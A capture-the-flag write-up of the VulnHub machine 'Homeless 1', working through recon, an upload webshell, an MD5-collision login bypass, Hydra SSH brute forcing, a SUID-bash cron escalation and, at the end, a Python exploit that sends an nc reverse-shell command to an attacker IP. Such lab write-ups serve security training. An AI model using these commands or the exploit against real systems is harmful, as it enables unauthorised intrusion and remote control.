# Homeless 1

## Nmap
````
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-27 19:13 WEST
Nmap scan report for 10.0.2.34
Host is up (0.00051s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 28:2c:a5:57:c7:eb:82:11:4e:bc:10:45:2f:68:58:f0 (RSA)
|   256 4d:44:7b:95:ce:9f:86:e2:c8:b4:1c:53:85:0d:90:4a (ECDSA)
|_  256 a6:d8:0a:4a:ca:d9:77:13:14:a0:36:54:94:8e:6f:2a (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_Use Brain with Google
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Transitive by TEMPLATED
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.87 seconds
````

## Port 80
Static website with an interesting /robots.txt

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/060285d5-6feb-486f-9fc3-20b1e1ff455d)

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/00da0d9b-706b-4978-a8c5-8903da308f54)

Hmm... let's carefully read the source code then

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/80bdce34-80a7-482b-ad45-155bc6b05542)


Cross-site scripting through the user agent? But it's reflected. Maybe I have to chain it with something else? Smuggling? Caching?

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/67fcbc8b-d3a5-479e-8021-8975d8f14cfa)


Nothing... So I went and opened every single file on the webserver and found something a bit different. The favicon is kinda weird

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/ad96ff53-eeb3-4dc1-80ab-e91f4638fe56)

I reverse image searched this and found some references to Cyberdog: `https://wiki.preterhuman.net/Cyberdog#Building-Custom-Documents`

Well, it's very CTFy, but changing the User-Agent to "Cyberdog" did the trick. Let's explore myuploader_priv

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/e5d45eb2-8189-4fa3-8e83-6099e70287c4)


![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/a6283049-6da5-4ad6-bf11-0f4446dc5993)

I quickly found the directory ``http://10.0.2.34/myuploader_priv/files/`` after a few seconds of directory busting. So we might have to upload a shell now.
Apparently I can only write around 7/8 characters before getting a "File too large" error message.

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/a2243b64-4439-48bb-9917-b95962ff7dbd)

This was the shortest payload I could come up with, but It's harmless

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/e82cdac3-aa28-43df-b25f-ad5a19e8115c)

Calling ls is useful tho

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/99be03fc-dc2d-484e-bfe8-3fb3951e4aea)

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/db0dd563-1458-449a-befc-2068fbf8ac01)


That's another page, okay


## /d5fa314e8577e3a7b8534a014b4dcb221de823ad

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/6a2cb219-996e-47fb-ac70-59b9d54f5eac)

See that 'need hint?' link? It downloads the source code. Time for a code review challenge!

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/f8761d51-b541-4bee-943e-40830fd5a4ba)

So, the md5sum of each of the fields must be the same, but the corresponding plaintext must not.
Magic hashes maybe? It can't be, it's a strict comparison

I turned to this guy's research and found his software. Lots of info in his repo and website, I won't go over it. It's a whole different topic
``https://github.com/cr-marcstevens/hashclash``

But anyway, I got the 3 different files with the same md5sum

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/66905a71-4a7d-4ed1-aa33-5d22c26f18e3)


The curl command was pretty tricky, but it finally worked

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/bf3d81f0-641a-4884-9719-20ae89893719)

I changed the cookie and browsed to /d5fa314e8577e3a7b8534a014b4dcb221de823ad/admin.php

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/539b0716-69ad-4a8d-acfa-84e4ba5eca37)


## Reverse Shell

A typical reverse shell payload worked wonders

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/3f91c39b-2640-4c2b-b139-a3d2ac7e3168)


## Privilege Escalation

The privilege escalation probably has something to do with python

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/f8d89b1a-cf5f-4c0b-b166-ac5069cfe982)


A few minutes of Pspy confirms this

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/79ac50d3-0e63-46c7-a8d4-4970f919cd6a)

Checking out this homeless.py file

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/09ac2e2f-4e1a-420a-bd75-4a81e8a1b179)

Can't do anything with this user. After a lot of time thinking, I remember the vulnhub page mentioned that we should use rock you and the password would start with 'sec'.
I used the following command the extract all the likely passwords from rock you
``cat rockyou.txt | grep "^sec" > /home/kali/Desktop/sec_rockyou``

Then ran hydra against the SSH service with the username 'downfall'

``hydra -l downfall -P sec_rockyou 10.0.2.34 ssh -t 10 -v -I``

And I finally found something

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/ee737194-6a57-4077-8dec-fb8a4f6964ab)

Many ways to do this, but basically just edit the homeless.py file. I delted it and created a new one with the following contents

````
#!/bin/bash
chmod +s /bin/bash
````

Since the cron job is basically just running it ``./homeless.py``, it can be a bash script

Rooted! A bit CTFy, slightly frustrating, but still pretty cool

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/3b9838b9-812f-4dec-ac56-b78c90cf307a)

___

Hello! I'm back a few weeks later. Here's the one-click exploit

````
import sys, requests, urllib, socket, time, threading, re

def main():
	session = requests.Session()
	#Login to the admin panel

	url = server + '/d5fa314e8577e3a7b8534a014b4dcb221de823ad/'
	headers = {"User-Agent": "curl/8.5.0", "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close"}
	# This sends the 3  files with the same md5 hash. Requires that you have the 3 files already created (f1, f2 and f3)
	with open('f1', 'rb') as f1:
		username = urllib.parse.quote(f1.read())
	with open('f2', 'rb') as f2:
                password = urllib.parse.quote(f2.read())
	with open('f3', 'rb') as f3:
                code = urllib.parse.quote(f3.read())

	data = "username={}&password={}&code={}&login=Login".format(username, password, code)
	r = session.post(url, headers=headers, data=data)

	if "Well Done" in r.text:
		print("[+] Logged in successfully")

	# RCE prep
	url = url + 'admin.php'
	data1 = {"command": "uname -a; id", "submit": "Submit Query"}
	data2 = {"command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f".format(attacker, port), "submit": "Submit Query"}

	# Launch RCE
	r = session.post(url, data=data1)
	# Print "flag" first
	print(re.findall(r"<pre>(.*?)</pred>", r.text, re.DOTALL)[0])
	print("Don't forget to open the listener on port {}".format(port))
	session.post(url, data=data2)

if __name__ == '__main__':
        try:
                server = sys.argv[1].strip()
                attacker = sys.argv[2].strip()
                port = sys.argv[3].strip()
        except:
                print("[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0])
                sys.exit()
        main()
````

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/480798be-1bfa-4c24-a622-c00d46ed306b)







